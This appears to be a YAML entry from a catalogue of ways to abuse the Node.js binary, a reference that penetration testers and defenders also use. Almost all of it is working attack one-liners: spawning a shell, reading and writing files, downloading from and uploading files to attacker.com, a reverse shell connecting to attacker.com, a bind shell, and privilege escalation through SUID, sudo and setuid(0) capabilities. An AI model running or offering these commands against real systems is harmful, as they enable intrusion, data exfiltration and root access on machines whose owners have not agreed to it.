---
functions:
  shell:
    - code: |
        node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
  file-write:
    - code: node -e 'fs.writeFileSync("file_to_write", "DATA")'
  file-read:
    - code: node -e 'process.stdout.write(fs.readFileSync("/bin/ls"))'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        node -e 'http.get(process.env.URL, res => res.pipe(fs.createWriteStream(process.env.LFILE)))'
  file-upload:
    - description: Send a local file via HTTP POST request.
      code: |
        export URL=http://attacker.com
        export LFILE=file_to_send
        node -e 'fs.createReadStream(process.env.LFILE).pipe(http.request(process.env.URL))'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        node -e 'sh = child_process.spawn("/bin/sh");
        net.connect(process.env.RPORT, process.env.RHOST, function () {
          this.pipe(sh.stdin);
          sh.stdout.pipe(this);
          sh.stderr.pipe(this);
        })'
  bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
      code: |
        export LPORT=12345
        node -e 'sh = child_process.spawn("/bin/sh");
        net.createServer(function (client) {
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
        }).listen(process.env.LPORT)'
  suid:
    - code: |
        ./node -e 'child_process.spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
  sudo:
    - code: |
        sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
  capabilities:
    - code: |
        ./node -e 'process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
---
